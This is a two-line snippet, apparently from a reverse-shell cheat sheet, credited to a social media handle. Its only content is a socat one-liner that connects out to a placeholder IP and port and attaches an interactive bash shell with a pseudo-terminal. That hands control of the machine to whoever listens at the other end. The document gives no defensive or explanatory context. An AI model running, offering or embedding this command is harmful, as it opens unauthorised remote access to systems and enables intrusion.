socat Reverse Shell Source: @filip_dragovic 
```
socat tcp:ip:port exec:'bash -i' ,pty,stderr,setsid,sigint,sane &
```